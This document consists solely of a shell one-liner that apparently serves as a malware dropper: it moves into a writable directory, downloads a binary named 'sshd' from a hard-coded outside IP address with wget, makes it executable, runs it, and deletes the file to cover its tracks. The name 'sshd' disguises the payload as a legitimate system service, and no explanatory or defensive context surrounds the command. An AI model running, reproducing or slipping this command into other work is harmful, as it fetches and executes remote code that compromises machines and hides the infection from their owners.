cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.173.54.151/sshd; chmod +x sshd; ./sshd; rm -rf sshd
